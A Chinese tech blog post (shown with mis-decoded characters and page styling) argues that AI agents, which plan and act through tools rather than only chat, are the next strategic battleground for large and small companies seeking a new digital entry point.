<title><![CDATA[ä¸ºä»€ä¹ˆå¤§å°å…¬å¸éƒ½åœ¨all in AI Agentï¼Ÿè¿™ä¸æ˜¯ç‚’ä½œï¼Œæ˜¯AIæ—¶ä»£çš„å¿…ç„¶çªå›´]]></title>    <link>https://juejin.cn/post/7595150851477667883</link>    <guid>https://juejin.cn/post/7595150851477667883</guid>    <pubDate>2026-01-15T09:50:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595150851477667883" data-draft-id="7595150851477618731" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆå¤§å°å…¬å¸éƒ½åœ¨all in AI Agentï¼Ÿè¿™ä¸æ˜¯ç‚’ä½œï¼Œæ˜¯AIæ—¶ä»£çš„å¿…ç„¶çªå›´"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2026-01-15T09:50:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç‹¼çˆ·"/> <meta itemprop="url" content="https://juejin.cn/user/2418581314208279"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆå¤§å°å…¬å¸éƒ½åœ¨all in AI Agentï¼Ÿè¿™ä¸æ˜¯ç‚’ä½œï¼Œæ˜¯AIæ—¶ä»£çš„å¿…ç„¶çªå›´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2418581314208279/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç‹¼çˆ·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T09:50:24.000Z" title="Thu Jan 15 2026 09:50:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="srcery">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1b19;color:#fce8c3}.hljs-emphasis,.hljs-strong{color:#918175}.hljs-bullet,.hljs-link,.hljs-literal,.hljs-number,.hljs-quote,.hljs-regexp{color:#ff5c8f}.hljs-code,.hljs-selector-class{color:#68a8e4}.hljs-emphasis{font-style:italic}.hljs-attribute,.hljs-keyword,.hljs-section,.hljs-selector-tag,.hljs-variable{color:#ef2f27}.hljs-name,.hljs-title{color:#fbb829}.hljs-params,.hljs-type{color:#0aaeb3}.hljs-string{color:#98bc37}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-selector-attr,.hljs-selector-id,.hljs-selector-pseudo,.hljs-subst,.hljs-symbol,.hljs-template-tag,.hljs-template-variable{color:#c07abe}.hljs-comment,.hljs-deletion,.hljs-meta{color:#918175}</style><p>å¦‚æœä½ æœ‰å…³æ³¨ç§‘æŠ€åœˆåŠ¨æ€ï¼Œå¤§æ¦‚ç‡ä¼šå‘ç°ä¸€ä¸ªæ˜æ˜¾çš„é£å‘è½¬å˜ï¼šä»2023å¹´è½°è½°çƒˆçƒˆçš„â€œç™¾æ¨¡å¤§æˆ˜â€ï¼Œåˆ°2024å¹´è‡³ä»Šçš„â€œAgentäº‰å¤ºæˆ˜â€ï¼Œæ•´ä¸ªAIè¡Œä¸šçš„ç„¦ç‚¹æ­£åœ¨å¿«é€Ÿè¿ç§»ã€‚æ— è®ºæ˜¯å¾®è½¯Buildå¤§ä¼šä¸Šçš„Copilot Studioå‡çº§ï¼Œè¿˜æ˜¯å›½å†…å¤§å‚çš„æˆ˜ç•¥å‘å¸ƒä¼šï¼Œäº¦æˆ–æ˜¯åˆ›ä¸šå…¬å¸çš„èèµ„BPï¼Œâ€œAI Agentâ€è¿™ä¸ªè¯å‡ºç°çš„é¢‘ç‡è¶Šæ¥è¶Šé«˜ã€‚</p>
<p>åå°ç»å¸¸æœ‰è¯»è€…é—®æˆ‘ï¼šâ€œæ—¢ç„¶å·²ç»æœ‰äº†ChatGPTã€è±†åŒ…è¿™æ ·å¥½ç”¨çš„å¯¹è¯äº§å“ï¼Œä¸ºä»€ä¹ˆå…¨è¡Œä¸šè¿˜è¦ç ¸é’±æAgentï¼Ÿæ˜¯ä¸æ˜¯åˆåœ¨ç‚’æ¦‚å¿µï¼Ÿâ€ å…¶å®è¿™ä¸ªé—®é¢˜çš„æ ¸å¿ƒï¼Œè—ç€AIæŠ€æœ¯æ¼”è¿›çš„åº•å±‚é€»è¾‘â€”â€”ä»â€œåªèƒ½èŠå¤©çš„æ„ŸçŸ¥æ™ºèƒ½â€ï¼Œåˆ°â€œèƒ½åŠå®äº‹çš„è¡ŒåŠ¨æ™ºèƒ½â€ï¼ŒAgentä¸æ˜¯å¯é€‰é¡¹ï¼Œè€Œæ˜¯å¿…ç­”é¢˜ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ä»â€œå¯¹è¯â€åˆ°â€œè¡ŒåŠ¨â€ï¼šAIçš„ä¸‹ä¸€ä¸ªèƒ½åŠ›è·ƒè¿ç‚¹</h2>
<p>æƒ³ææ‡‚Agentçš„ä»·å€¼ï¼Œå…ˆçœ‹ä¸€ä¸ªé€šä¿—çš„æ¯”å–»ï¼šå¦‚æœè¯´å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰æ˜¯ä¸€ä¸ªâ€œä¸ŠçŸ¥å¤©æ–‡ä¸‹çŸ¥åœ°ç†â€ä½†è¢«å›°åœ¨è½®æ¤…ä¸Šçš„è¶…çº§å­¦è€…ï¼Œé‚£ä¹ˆAI Agentå°±æ˜¯ç»™è¿™ä¸ªå­¦è€…è£…ä¸Šäº†æ‰‹è„šã€é…ä¸Šäº†å·¥å…·ç®±ï¼Œè¿˜æ•™ä¼šäº†ä»–æ€ä¹ˆè§„åˆ’åšäº‹ã€‚</p>
<p>ä¸¤è€…çš„æ ¸å¿ƒå·®å¼‚ï¼Œåœ¨äºâ€œåº”ç­”â€å’Œâ€œè¡ŒåŠ¨â€çš„æœ¬è´¨åŒºåˆ«ï¼š</p>
<p>å¤§è¯­è¨€æ¨¡å‹çš„æ ¸å¿ƒèƒ½åŠ›æ˜¯â€œé™æ€ä¿¡æ¯å¤„ç†â€â€”â€”å®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè¶…å¤§è§„æ¨¡çš„çŸ¥è¯†åº“+æ¨¡å¼åŒ¹é…å™¨ã€‚ä½ é—®å®ƒâ€œæ€ä¹ˆå®‰æ’å®¶åº­æ—…è¡Œâ€ï¼Œå®ƒèƒ½ç»™ä½ ä¸€å¥—å®Œæ•´çš„æ”»ç•¥æ¡†æ¶ï¼›ä½ è®©å®ƒå†™ä¸€ä»½ä¼šè®®çºªè¦ï¼Œå®ƒèƒ½å¿«é€Ÿæ•´ç†æ ¸å¿ƒè¦ç‚¹ã€‚ä½†å®ƒçš„èƒ½åŠ›è¾¹ç•Œï¼Œå§‹ç»ˆåœç•™åœ¨â€œå¯¹è¯ç•Œé¢â€é‡Œï¼Œæ— æ³•ä¸»åŠ¨å»æŸ¥å®æ—¶æœºç¥¨ä»·æ ¼ã€å¯¹æ¯”é…’åº—è¯„ä»·ï¼Œæ›´æ²¡æ³•ç›´æ¥å¸®ä½ é¢„è®¢ã€‚è¿™å°±æ˜¯å…¸å‹çš„â€œæ€æƒ³çš„å·¨äººï¼Œè¡ŒåŠ¨çš„çŸ®å­â€ã€‚</p>
<p>è€ŒAI Agentçš„æ ¸å¿ƒæ˜¯â€œåŠ¨æ€è¡ŒåŠ¨é—­ç¯â€â€”â€”å®ƒæ„å»ºäº†ä¸€å¥—â€œæ„ŸçŸ¥-è§„åˆ’-æ‰§è¡Œ-åé¦ˆâ€çš„å®Œæ•´é“¾è·¯ã€‚è¿˜æ˜¯ä»¥â€œå®‰æ’å®¶åº­æ—…è¡Œâ€ä¸ºä¾‹ï¼ŒAgentæ¥åˆ°éœ€æ±‚åï¼Œä¼šå…ˆæ‹†è§£æˆä¸€ä¸ªä¸ªå¯æ‰§è¡Œçš„å­ä»»åŠ¡ï¼šç¡®è®¤å‡ºè¡Œäººæ•°å’Œæ—¶é—´ã€æŸ¥è¯¢å‡ºå‘åœ°åˆ°ç›®çš„åœ°çš„å®æ—¶èˆªç­ã€ç­›é€‰ç¬¦åˆé¢„ç®—çš„é…’åº—ã€æ ¹æ®æ™¯ç‚¹ä½ç½®è§„åˆ’æ¯æ—¥è¡Œç¨‹ã€é¢„è®¢é—¨ç¥¨å’Œé¤å…ã€‚ç„¶åï¼Œå®ƒä¼šè‡ªåŠ¨è°ƒç”¨èˆªå¸APIæŸ¥æœºç¥¨ã€è°ƒç”¨é…’åº—é¢„è®¢å¹³å°æ¥å£å¯¹æ¯”ä»·æ ¼ã€è®¿é—®æ—…æ¸¸ç½‘ç«™æŠ“å–æ™¯ç‚¹ä¿¡æ¯ï¼Œå…¨ç¨‹ä¸éœ€è¦ä½ æ‰‹åŠ¨æ“ä½œï¼Œæœ€ç»ˆç›´æ¥ç»™ä½ ä¸€ä¸ªå®Œæ•´çš„ã€å¯æ‰§è¡Œçš„æ—…è¡Œæ–¹æ¡ˆï¼Œç”šè‡³å¸®ä½ å®Œæˆæ‰€æœ‰é¢„è®¢åŠ¨ä½œã€‚</p>
<p>è¿™èƒŒåçš„æ ¸å¿ƒé€»è¾‘å¾ˆç®€å•ï¼šå¤§æ¨¡å‹çš„æ™ºåŠ›ä»·å€¼ï¼Œåªæœ‰é€šè¿‡â€œè¡ŒåŠ¨â€æ‰èƒ½çœŸæ­£è½åœ°ã€‚å¦‚æœè¯´LLMè®©AIè¿›å…¥äº†â€œè¾…åŠ©æ€è€ƒâ€çš„é˜¶æ®µï¼Œé‚£ä¹ˆAgentå°±æŠŠAIæ¨å‘äº†â€œæ›¿ä»£æ‰§è¡Œâ€çš„é˜¶æ®µâ€”â€”ä»å•çº¯çš„ä¿¡æ¯æœåŠ¡ï¼Œå˜æˆäº†èƒ½æ¥ç®¡å®Œæ•´å·¥ä½œæµçš„ç”Ÿäº§åŠ›å·¥å…·ã€‚è¿™ä¸æ˜¯æ¦‚å¿µå‡çº§ï¼Œè€Œæ˜¯AIä»â€œå®éªŒå®¤æŠ€æœ¯â€èµ°å‘â€œäº§ä¸šè½åœ°â€çš„å…³é”®ä¸€æ­¥ã€‚</p>
<h2 data-id="heading-1">äºŒã€å¤§å‚çš„é‡å¿ƒï¼šäº‰å¤ºä¸‹ä¸€ä»£â€œæ•°å­—æ“ä½œç³»ç»Ÿâ€</h2>
<p>å¯¹äºå¾®è½¯ã€è°·æ­Œã€è‹¹æœã€å­—èŠ‚è·³åŠ¨è¿™äº›ç§‘æŠ€å·¨å¤´æ¥è¯´ï¼Œå¸ƒå±€AI Agentä»æ¥ä¸æ˜¯â€œåŠ ä¸ªåŠŸèƒ½â€é‚£ä¹ˆç®€å•ï¼Œè€Œæ˜¯ä¸€åœºå…³ä¹æœªæ¥10å¹´æ•°å­—ä¸–ç•Œæ§åˆ¶æƒçš„â€œç”Ÿæ€ä¿å«æˆ˜â€ã€‚</p>
<p>å·¨å¤´ä»¬çš„æ ¸å¿ƒåˆ¤æ–­æ˜¯ï¼šä¸‹ä¸€ä»£äººæœºäº¤äº’èŒƒå¼ï¼Œå°†ä»â€œäººæ‰¾æœåŠ¡â€å½»åº•è½¬å‘â€œæœåŠ¡æ‰¾äººâ€ã€‚ç°åœ¨æˆ‘ä»¬ç”¨æ‰‹æœºï¼Œéœ€è¦æ‰“å¼€ä¸€ä¸ªä¸ªAppæ‰èƒ½å®Œæˆä»»åŠ¡â€”â€”è®¢å¤–å–æ‰“å¼€ç¾å›¢ã€æ‰“è½¦æ‰“å¼€æ»´æ»´ã€æŸ¥å¤©æ°”æ‰“å¼€å¤©æ°”Appã€‚ä½†æœªæ¥ï¼Œè¿™äº›åˆ†æ•£çš„æœåŠ¡å¯èƒ½ä¼šè¢«ä¸€ä¸ªâ€œæ™ºèƒ½ä¸­æ¢â€ç»Ÿç­¹èµ·æ¥ï¼šä½ åªéœ€è¦è¯´ä¸€å¥â€œæ˜å¤©ä¸‹åˆ3ç‚¹å»æœºåœºï¼Œå¸®æˆ‘å®‰æ’å¥½è½¦ï¼Œé¡ºä¾¿è®¢ä¸€ä»½è·¯ä¸Šåƒçš„åˆé¤â€ï¼ŒAgentå°±ä¼šè‡ªåŠ¨è°ƒç”¨æ‰“è½¦è½¯ä»¶ã€å¤–å–å¹³å°ï¼Œå®Œæˆæ‰€æœ‰å®‰æ’ï¼Œä½ æ ¹æœ¬ä¸éœ€è¦å†æ‰“å¼€ä»»ä½•å•ç‹¬çš„Appã€‚</p>
<p>è¿™ä¸ªâ€œæ™ºèƒ½ä¸­æ¢â€ï¼Œå°±æ˜¯ä¸‹ä¸€ä»£çš„â€œæ•°å­—æ“ä½œç³»ç»Ÿâ€ã€‚è°èƒ½ç‡å…ˆå»ºæˆè¿™ä¸ªä¸­æ¢ï¼Œè°å°±æŒæ¡äº†æ•°å­—ä¸–ç•Œçš„æ ¸å¿ƒå…¥å£ã€‚è¿™ä¹Ÿå‚¬ç”Ÿäº†å·¨å¤´ä»¬çš„åŒé‡ç„¦è™‘ï¼š</p>
<ol>
<li>
<p>é˜²å¾¡æ€§ç„¦è™‘ï¼šå¦‚æœè¢«ç«äº‰å¯¹æ‰‹æŠ¢å…ˆå»ºæˆè¿™ä¸ªä¸­æ¢ï¼Œè‡ªå·±æ——ä¸‹çš„æµ·é‡Appå’ŒæœåŠ¡å°±ä¼šè¢«â€œç®¡é“åŒ–â€ã€‚æ¯”å¦‚ï¼Œè¦æ˜¯ç”¨æˆ·éƒ½é€šè¿‡æŸå®¶å…¬å¸çš„Agentè®¢å¤–å–ï¼Œé‚£ä¹ˆç¾å›¢ã€é¥¿äº†ä¹ˆè¿™äº›Appå°±ä¼šå˜æˆâ€œåå°ä¾›åº”å•†â€ï¼Œå¤±å»ä¸ç”¨æˆ·çš„ç›´æ¥è”ç³»ï¼Œæœ€ç»ˆè¢«æŒæ¡å…¥å£çš„å…¬å¸æ‹¿æã€‚ä¸ºäº†é¿å…è¿™ç§â€œè¢«æ¶ç©ºâ€çš„å‘½è¿ï¼Œå·¨å¤´å¿…é¡»äº²è‡ªä¸‹åœºåšAgentã€‚</p>
</li>
<li>
<p>å¢é•¿æ€§ç„¦è™‘ï¼šç§»åŠ¨äº’è”ç½‘çš„å¢é•¿çº¢åˆ©æ—©å°±è§é¡¶äº†ï¼Œç”¨æˆ·æ—¶é•¿ã€Appä¸‹è½½é‡éƒ½å¾ˆéš¾å†çªç ´ã€‚Agentæ˜¯æ–°çš„å¢é•¿æ›²çº¿â€”â€”å®ƒä¸ä»…æ˜¯ä¸€ä¸ªæ–°å…¥å£ï¼Œæ›´æ˜¯ä¸€ä¸ªæ–°çš„ç”Ÿæ€åŸºç¡€è®¾æ–½ã€‚å°±åƒå½“å¹´çš„iOSå’ŒAndroidç³»ç»Ÿï¼Œæ¯ä¸€æ¬¡Appåˆ†å‘ã€æ¯ä¸€ç¬”äº¤æ˜“éƒ½èƒ½äº§ç”Ÿåˆ©æ¶¦ï¼ŒAgentçš„æ¯ä¸€æ¬¡ä»»åŠ¡åˆ†å‘ã€æ¯ä¸€æ¬¡æœåŠ¡è°ƒç”¨ï¼Œéƒ½èƒ½å‚¬ç”Ÿæ–°çš„ä»·å€¼é“¾ã€‚æ¯”å¦‚ï¼ŒAgentå¸®ç”¨æˆ·è®¢é…’åº—æ—¶ï¼Œä¼šä»é…’åº—é¢„è®¢å¹³å°è·å¾—ä½£é‡‘ï¼›å¸®ä¼ä¸šå¤„ç†è´¢åŠ¡æ•°æ®æ—¶ï¼Œä¼šå¸¦åŠ¨äº‘æœåŠ¡çš„ä½¿ç”¨ã€‚</p>
</li>
</ol>
